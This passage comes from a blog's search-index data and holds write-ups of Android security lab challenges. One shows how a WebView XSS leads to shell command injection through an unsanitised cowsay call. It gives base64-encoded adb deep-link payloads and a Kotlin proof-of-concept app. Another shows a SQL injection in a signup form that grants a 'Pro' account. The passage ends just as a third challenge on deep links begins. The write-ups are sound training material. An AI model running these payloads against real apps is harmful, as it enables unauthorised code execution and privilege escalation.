on to the main activity code, there\u0026rsquo;s a function for setting up WebView and it has JavaScript enabled. As for the handleIntent function, it basically accept intent and use the data as message after base64 decode and the message will be used in WebView while executing the JavaScript function WebAppInterface.postMarkdownMessage. If there\u0026rsquo;s an error, it will instead execute the JavaScript function WebAppInterface.postCowsayMessage.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 @JavascriptInterface public final void postMarkdownMessage(String markdownMessage) { Intrinsics.checkNotNullParameter(markdownMessage, \u0026#34;markdownMessage\u0026#34;); String html = new Regex(\u0026#34;```(.*?)```\u0026#34;, RegexOption.DOT_MATCHES_ALL).replace(markdownMessage, \u0026#34;\u0026lt;pre\u0026gt;\u0026lt;code\u0026gt;$1\u0026lt;/code\u0026gt;\u0026lt;/pre\u0026gt;\u0026#34;); String html2 = new Regex(\u0026#34;`([^`]+)`\u0026#34;).replace(html, \u0026#34;\u0026lt;code\u0026gt;$1\u0026lt;/code\u0026gt;\u0026#34;); String html3 = new Regex(\u0026#34;!\\\\[(.*?)\\\\]\\\\((.*?)\\\\)\u0026#34;).replace(html2, \u0026#34;\u0026lt;img src=\u0026#39;$2\u0026#39; alt=\u0026#39;$1\u0026#39;/\u0026gt;\u0026#34;); String html4 = new Regex(\u0026#34;###### (.*)\u0026#34;).replace(html3, \u0026#34;\u0026lt;h6\u0026gt;$1\u0026lt;/h6\u0026gt;\u0026#34;); String html5 = new Regex(\u0026#34;##### (.*)\u0026#34;).replace(html4, \u0026#34;\u0026lt;h5\u0026gt;$1\u0026lt;/h5\u0026gt;\u0026#34;); String html6 = new Regex(\u0026#34;#### (.*)\u0026#34;).replace(html5, \u0026#34;\u0026lt;h4\u0026gt;$1\u0026lt;/h4\u0026gt;\u0026#34;); String html7 = new Regex(\u0026#34;### (.*)\u0026#34;).replace(html6, \u0026#34;\u0026lt;h3\u0026gt;$1\u0026lt;/h3\u0026gt;\u0026#34;); String html8 = new Regex(\u0026#34;## (.*)\u0026#34;).replace(html7, \u0026#34;\u0026lt;h2\u0026gt;$1\u0026lt;/h2\u0026gt;\u0026#34;); String html9 = new Regex(\u0026#34;# (.*)\u0026#34;).replace(html8, \u0026#34;\u0026lt;h1\u0026gt;$1\u0026lt;/h1\u0026gt;\u0026#34;); String html10 = new Regex(\u0026#34;\\\\*\\\\*(.*?)\\\\*\\\\*\u0026#34;).replace(html9, \u0026#34;\u0026lt;b\u0026gt;$1\u0026lt;/b\u0026gt;\u0026#34;); String html11 = new Regex(\u0026#34;\\\\*(.*?)\\\\*\u0026#34;).replace(html10, \u0026#34;\u0026lt;i\u0026gt;$1\u0026lt;/i\u0026gt;\u0026#34;); String html12 = new Regex(\u0026#34;~~(.*?)~~\u0026#34;).replace(html11, \u0026#34;\u0026lt;del\u0026gt;$1\u0026lt;/del\u0026gt;\u0026#34;); String html13 = new Regex(\u0026#34;\\\\[([^\\\\[]+)\\\\]\\\\(([^)]+)\\\\)\u0026#34;).replace(html12, \u0026#34;\u0026lt;a href=\u0026#39;$2\u0026#39;\u0026gt;$1\u0026lt;/a\u0026gt;\u0026#34;); String html14 = new Regex(\u0026#34;(?m)^(\\\\* .+)((\\\\n\\\\* .+)*)\u0026#34;).replace(html13, new Function1\u0026lt;MatchResult, CharSequence\u0026gt;() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1 @Override // kotlin.jvm.functions.Function1 public final CharSequence invoke(MatchResult matchResult) { Intrinsics.checkNotNullParameter(matchResult, \u0026#34;matchResult\u0026#34;); return \u0026#34;\u0026lt;ul\u0026gt;\u0026#34; + CollectionsKt.joinToString$default(StringsKt.split$default((CharSequence) matchResult.getValue(), new String[]{\u0026#34;\\n\u0026#34;}, false, 0, 6, (Object) null), \u0026#34;\u0026#34;, null, null, 0, null, new Function1\u0026lt;String, CharSequence\u0026gt;() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$1.1 @Override // kotlin.jvm.functions.Function1 public final CharSequence invoke(String it) { Intrinsics.checkNotNullParameter(it, \u0026#34;it\u0026#34;); StringBuilder append = new StringBuilder().append(\u0026#34;\u0026lt;li\u0026gt;\u0026#34;); String substring = it.substring(2); Intrinsics.checkNotNullExpressionValue(substring, \u0026#34;this as java.lang.String).substring(startIndex)\u0026#34;); return append.append(substring).append(\u0026#34;\u0026lt;/li\u0026gt;\u0026#34;).toString(); } }, 30, null) + \u0026#34;\u0026lt;/ul\u0026gt;\u0026#34;; } }); String html15 = new Regex(\u0026#34;(?m)^\\\\d+\\\\. .+((\\\\n\\\\d+\\\\. .+)*)\u0026#34;).replace(html14, new Function1\u0026lt;MatchResult, CharSequence\u0026gt;() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2 @Override // kotlin.jvm.functions.Function1 public final CharSequence invoke(MatchResult matchResult) { Intrinsics.checkNotNullParameter(matchResult, \u0026#34;matchResult\u0026#34;); return \u0026#34;\u0026lt;ol\u0026gt;\u0026#34; + CollectionsKt.joinToString$default(StringsKt.split$default((CharSequence) matchResult.getValue(), new String[]{\u0026#34;\\n\u0026#34;}, false, 0, 6, (Object) null), \u0026#34;\u0026#34;, null, null, 0, null, new Function1\u0026lt;String, CharSequence\u0026gt;() { // from class: com.mobilehackinglab.postboard.WebAppInterface$postMarkdownMessage$2.1 @Override // kotlin.jvm.functions.Function1 public final CharSequence invoke(String it) { Intrinsics.checkNotNullParameter(it, \u0026#34;it\u0026#34;); StringBuilder append = new StringBuilder().append(\u0026#34;\u0026lt;li\u0026gt;\u0026#34;); String substring = it.substring(StringsKt.indexOf$default((CharSequence) it, \u0026#39;.\u0026#39;, 0, false, 6, (Object) null) + 2); Intrinsics.checkNotNullExpressionValue(substring, \u0026#34;this as java.lang.String).substring(startIndex)\u0026#34;); return append.append(substring).append(\u0026#34;\u0026lt;/li\u0026gt;\u0026#34;).toString(); } }, 30, null) + \u0026#34;\u0026lt;/ol\u0026gt;\u0026#34;; } }); String html16 = new Regex(\u0026#34;^\u0026gt; (.*)\u0026#34;, RegexOption.MULTILINE).replace(html15, \u0026#34;\u0026lt;blockquote\u0026gt;$1\u0026lt;/blockquote\u0026gt;\u0026#34;); this.cache.addMessage(new Regex(\u0026#34;^(---|\\\\*\\\\*\\\\*|___)$\u0026#34;, RegexOption.MULTILINE).replace(html16, \u0026#34;\u0026lt;hr\u0026gt;\u0026#34;)); } @JavascriptInterface public final void postCowsayMessage(String cowsayMessage) { Intrinsics.checkNotNullParameter(cowsayMessage, \u0026#34;cowsayMessage\u0026#34;); String asciiArt = CowsayUtil.INSTANCE.runCowsay(cowsayMessage); String html = StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(StringsKt.replace$default(asciiArt, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;\u0026amp;amp;\u0026#34;, false, 4, (Object) null), \u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026amp;lt;\u0026#34;, false, 4, (Object) null), \u0026#34;\u0026gt;\u0026#34;, \u0026#34;\u0026amp;gt;\u0026#34;, false, 4, (Object) null), \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026amp;quot;\u0026#34;, false, 4, (Object) null), \u0026#34;\u0026#39;\u0026#34;, \u0026#34;\u0026amp;#039;\u0026#34;, false, 4, (Object) null); this.cache.addMessage(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34; + StringsKt.replace$default(html, \u0026#34;\\n\u0026#34;, \u0026#34;\u0026lt;br\u0026gt;\u0026#34;, false, 4, (Object) null) + \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); } Looking at both the JavaScript function, the postMarkdownMessage function has a set of rules where it only allows specific HTML tag to be rendered in the WebView. The HTML that might be useful is \u0026lt;img\u0026gt; and \u0026lt;a\u0026gt; as this 2 could potentially trigger XSS. Moving on to postCowsayMessage, it will run CowsayUtil.INSTANCE.runCowsay function.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public final String runCowsay(String message) { Intrinsics.checkNotNullParameter(message, \u0026#34;message\u0026#34;); try { String[] command = {\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, CowsayUtil.scriptPath + \u0026#39; \u0026#39; + message}; Process process = Runtime.getRuntime().exec(command); StringBuilder output = new StringBuilder(); InputStream inputStream = process.getInputStream(); Intrinsics.checkNotNullExpressionValue(inputStream, \u0026#34;getInputStream(...)\u0026#34;); Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8); BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192); try { BufferedReader reader = bufferedReader; while (true) { String it = reader.readLine(); if (it == null) { Unit unit = Unit.INSTANCE; Closeable.closeFinally(bufferedReader, null); process.waitFor(); String sb = output.toString(); Intrinsics.checkNotNullExpressionValue(sb, \u0026#34;toString(...)\u0026#34;); return sb; } output.append(it).append(\u0026#34;\\n\u0026#34;); } } finally { } } catch (Exception e) { e.printStackTrace(); return \u0026#34;cowsay: \u0026#34; + e.getMessage(); } } Looking into the runCowsay function, it basically interacting with shell command which I could inject my command easily since it is not sanitized. Now that I have some basic understanding, I tried to perform dynamic analysis to check if its correct.\nDynamic Analysis Based on my previous information, I will need to provide a URI postboard://postmessage and following with the message. The message will need to be base64 encoded. I started off by create a simple xss payload \u0026lt;a href=\u0026quot;javascript:alert(1)\u0026quot;\u0026gt;yeeehar\u0026lt;/a\u0026gt; and inject to the application.\n1 2 adb shell am start -a android.intent.action.VIEW -d \u0026#39;postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDphbGVydCgxKSI-eWVlZWhhcjwvYT4\u0026#39; Starting: Intent { act=android.intent.action.VIEW dat=postboard://postmessage/... } This method allows me to perform XSS but it will need me to click the hyperlink. I continue by crafting the payload to trigger the vulnerable function, \u0026lt;a href=\u0026quot;javascript:WebAppInterface.postCowsayMessage('hi;id');location.reload();\u0026quot;\u0026gt;yeehar\u0026lt;/a\u0026gt;\n1 2 adb shell am start -a android.intent.action.VIEW -d \u0026#39;postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDpXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ2hpO2lkJyk7bG9jYXRpb24ucmVsb2FkKCk7Ij55ZWVoYXI8L2E-\u0026#39; Starting: Intent { act=android.intent.action.VIEW dat=postboard://postmessage/... } I managed to perform RCE by triggering the function and perform simple command injection. I then proceed to write a simple POC app to perform the attack in Kotlin. Do note that it is also possible to use img tag and it could trigger the function without performing any click.\n1 2 3 4 5 6 7 8 9 val intent = Intent().apply { setClassName( \u0026#34;com.mobilehackinglab.postboard\u0026#34;, \u0026#34;com.mobilehackinglab.postboard.MainActivity\u0026#34; ) data = Uri.parse(\u0026#34;postboard://postmessage/PGEgaHJlZj0iamF2YXNjcmlwdDpXZWJBcHBJbnRlcmZhY2UucG9zdENvd3NheU1lc3NhZ2UoJ2hpO2lkJyk7bG9jYXRpb24ucmVsb2FkKCk7Ij55ZWVoYXI8L2E-\u0026#34;) action = Intent.ACTION_VIEW } startActivity(intent) Things I learned from this challenge Source code review to find potential RCE and XSS ","permalink":"https://callmeks.github.io/posts/mhl-post-board/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Android Insecure WebView Challenge! This challenge is designed to delve into the complexities of Android\u0026rsquo;s WebView component, exploiting a Cross-Site Scripting (XSS) vulnerability to achieve Remote Code Execution (RCE). It\u0026rsquo;s an immersive opportunity for participants to engage with Android application security, particularly focusing on WebView security issues.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/postboard.apk\"\u003epostboard.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eAs usual, I started by performing static analysis to get some understanding of the application.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eI started out by reading the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e code after decompiling using \u003ccode\u003ejadx-gui\u003c/code\u003e.\u003c/p\u003e","title":"MHL Post Board"},{"content":"Challenge Description Welcome to the Android App Security Lab: SQL Injection Challenge! Dive into the world of cybersecurity with our hands-on lab. This challenge is centered around a fictitious \u0026ldquo;Food Store\u0026rdquo; app, highlighting the critical security flaw of SQL Injection (SQLi) within the app\u0026rsquo;s framework.\nfoodstore.apk\nSolution As usual, static analysis to understand first.\nStatic Analysis I started out by reading the AndroidManifest.xml code first.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.foodstore.Signup\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.foodstore.MainActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.foodstore.LoginActivity\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.MAIN\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.LAUNCHER\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; There is a Signup, MainActivity and LoginActivity activity but only Signup activity is not exported. Reading the objective provided, this challenge will be focused in the signup function.\nExploit a SQL Injection Vulnerability: Your mission is to manipulate the signup function in the \u0026ldquo;Food Store\u0026rdquo; Android application, allowing you to register as a Pro user, bypassing standard user restrictions.\nIn that case, I start reading the Signup activity first.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 public static final void onCreate$lambda$0(Signup this$0, View it) { Intrinsics.checkNotNullParameter(this$0, \u0026#34;this$0\u0026#34;); EditText editText = this$0.username; EditText editText2 = null; if (editText == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;username\u0026#34;); editText = null; } if (!(StringsKt.trim((CharSequence) editText.getText().toString()).toString().length() == 0)) { EditText editText3 = this$0.password; if (editText3 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;password\u0026#34;); editText3 = null; } if (!(StringsKt.trim((CharSequence) editText3.getText().toString()).toString().length() == 0)) { EditText editText4 = this$0.address; if (editText4 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;address\u0026#34;); editText4 = null; } if (!(StringsKt.trim((CharSequence) editText4.getText().toString()).toString().length() == 0)) { DBHelper dbHelper = new DBHelper(this$0); int i = 0; EditText editText5 = this$0.username; if (editText5 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;username\u0026#34;); editText5 = null; } String obj = editText5.getText().toString(); EditText editText6 = this$0.password; if (editText6 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;password\u0026#34;); editText6 = null; } String obj2 = editText6.getText().toString(); EditText editText7 = this$0.address; if (editText7 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;address\u0026#34;); } else { editText2 = editText7; } User newUser = new User(i, obj, obj2, editText2.getText().toString(), false, 1, null); dbHelper.addUser(newUser); Toast.makeText(this$0, \u0026#34;User Registered Successfully\u0026#34;, 0).show(); return; } } } Toast.makeText(this$0, \u0026#34;Please fill in all fields\u0026#34;, 0).show(); } Looking into the code, it basically just getting strings from each text field and send the information into dbHelper.addUser(newUser) function.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public final void addUser(User user) { Intrinsics.checkNotNullParameter(user, \u0026#34;user\u0026#34;); SQLiteDatabase db = getWritableDatabase(); byte[] bytes = user.getPassword().getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(bytes, \u0026#34;this as java.lang.String).getBytes(charset)\u0026#34;); String encodedPassword = Base64.encodeToString(bytes, 0); String Username = user.getUsername(); byte[] bytes2 = user.getAddress().getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(bytes2, \u0026#34;this as java.lang.String).getBytes(charset)\u0026#34;); String encodedAddress = Base64.encodeToString(bytes2, 0); String sql = \u0026#34;INSERT INTO users (username, password, address, isPro) VALUES (\u0026#39;\u0026#34; + Username + \u0026#34;\u0026#39;, \u0026#39;\u0026#34; + encodedPassword + \u0026#34;\u0026#39;, \u0026#39;\u0026#34; + encodedAddress + \u0026#34;\u0026#39;, 0)\u0026#34;; db.execSQL(sql); db.close(); } After looking into the addUser function code, the first thing i noticed is this + Username + which definitely vulnerable to SQL injection. Although encodedPassword and encodedAddress is also vulnerable to SQL injection, it is harder to perform attacks as the input will be base64 encode which mean I can only inject in the Username parameter. Now that I understand how things work, time to perform dynamic analysis to test out my theory.\nDynamic analysis I immediately started out by testing the signup function.\nI tried out simple SQL injection technique first by putting a single quote and I got some interesting error.\n1 2 3 android.database.sqlite.SQLiteException: near \u0026#34;Yg\u0026#34;: syntax error (code 1 SQLITE_ERROR): , while compiling: INSERT INTO users (username, password, address, isPro) VALUES (\u0026#39;a\u0026#39;\u0026#39;, \u0026#39;Yg== \u0026#39;, \u0026#39;Yg== \u0026#39;, 0) I then tried to craft a simple payload like a');-- to see if it accept.\n1 2 3 android.database.sqlite.SQLiteException: 1 values for 4 columns (code 1 SQLITE_ERROR): , while compiling: INSERT INTO users (username, password, address, isPro) VALUES (\u0026#39;a\u0026#39;);--\u0026#39;, \u0026#39;Yg== \u0026#39;, \u0026#39;Yg== \u0026#39;, 0) Based on the error, I managed to inject data into it but it needs 4 values but I only provided one. I then craft another one a','Yg==','Yg==',1);--. The last value need to changed to 1 because of the objective where I need to create a Pro account.\nThis time, I did not get any error which mean I successfully inject my payload via SQL injection. I then login using the user and see if I am Pro user.\nI am now a Pro user according to the image which mean I successfully performed the SQL injection.\nThings I learned from this challenge SQL injection source code review in Java ","permalink":"https://callmeks.github.io/posts/mhl-food-store/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWelcome to the Android App Security Lab: SQL Injection Challenge! Dive into the world of cybersecurity with our hands-on lab. This challenge is centered around a fictitious \u0026ldquo;Food Store\u0026rdquo; app, highlighting the critical security flaw of SQL Injection (SQLi) within the app\u0026rsquo;s framework.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"static/foodstore.apk\"\u003efoodstore.apk\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eAs usual, static analysis to understand first.\u003c/p\u003e\n\u003ch3 id=\"static-analysis\"\u003eStatic Analysis\u003c/h3\u003e\n\u003cp\u003eI started out by reading the \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e code first.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-1\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-2\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-3\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-4\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-5\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-6\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-7\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-8\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-9\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-10\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-11\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-12\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-13\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\" id=\"hl-0-14\"\u003e\u003ca style=\"outline:none;text-decoration:none;color:inherit\" href=\"#hl-0-14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.mobilehackinglab.foodstore.Signup\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:exported=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;false\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.mobilehackinglab.foodstore.MainActivity\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:exported=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;activity\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;com.mobilehackinglab.foodstore.LoginActivity\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eandroid:exported=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.action.MAIN\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eandroid:name=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;android.intent.category.LAUNCHER\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eThere is a \u003ccode\u003eSignup\u003c/code\u003e, \u003ccode\u003eMainActivity\u003c/code\u003e and \u003ccode\u003eLoginActivity\u003c/code\u003e activity but only \u003ccode\u003eSignup\u003c/code\u003e activity is not exported. Reading the objective provided, this challenge will be focused in the signup function.\u003c/p\u003e","title":"MHL Food Store"},{"content":"Challenge Description Welcome to the \u0026ldquo;Guess Me\u0026rdquo; Deep Link Exploitation Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge revolves around a fictitious \u0026ldquo;Guess Me\u0026rdquo; app, shedding light on a critical security flaw related to deep links that can lead to remote code execution within the app\u0026rsquo;s framework.\nguessme.apk\nSolution I started out by performing static analysis.\nStatic Analysis As usual, jadx-gui for reading the code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;activity android:name=\u0026#34;com.mobilehackinglab.guessme.MainActivity\u0026#34; 